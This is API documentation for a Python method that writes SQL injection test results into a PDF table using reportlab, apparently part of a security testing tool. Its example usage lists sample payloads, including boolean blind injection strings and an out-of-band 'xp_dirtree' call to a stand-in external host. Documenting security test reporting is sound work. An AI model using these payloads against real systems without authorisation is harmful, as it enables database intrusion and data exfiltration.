
## Method Name:

`generate_pdf_report(results: List[Tuple[str, str, Union[str, Tuple[str, str]]]], filename: str) -> None`

## Description:

This method generates a PDF report containing the results of the SQL injection testing. The method takes in a list of tuples containing the vulnerable parameter, the type of SQL injection attack, and the payload used for the attack, and a filename for the generated PDF report. The method generates a table from the input data and styles the table. Then it creates a PDF document and adds the table to the document. Finally, it saves the PDF document with the specified filename.

## Parameters:

-   `results`: A list of tuples containing the vulnerable parameter, the type of SQL injection attack, and the payload used for the attack.
-   `filename`: A string representing the filename for the generated PDF report.

## Returns:

-   None

## Method Steps:

1.  Create a list of lists containing the table data by concatenating a header row and the input data.
2.  Create a `Table` object from the table data using the `Table` class from the `reportlab.platypus` module.
3.  Define the style for the table using the `TableStyle` class from the `reportlab.platypus` module.
4.  Apply the table style to the table using the `setStyle` method of the `Table` object.
5.  Create a `SimpleDocTemplate` object from the filename and the `letter` page size using the `SimpleDocTemplate` class from the `reportlab.platypus` module.
6.  Build the PDF document by adding the table to the document using the `build` method of the `SimpleDocTemplate` object.
7.  Save the PDF document with the specified filename.

## Exceptions:

-   This method may raise exceptions from any of the functions or classes called within it, such as `Table`, `TableStyle`, `SimpleDocTemplate`, and `build`.

## Example Usage:
```
results = [("q", "Classic SQLi", "'"), ("category", "Blind SQLi (Inferential)", ("1' AND 1=1--", "1' AND 1=2--")), ("q", "Out-of-band SQLi", "1'; EXEC xp_dirtree 'http://examplednslog.com';--")]
filename = "sql_injection_report.pdf"

generate_pdf_report(results, filename)
```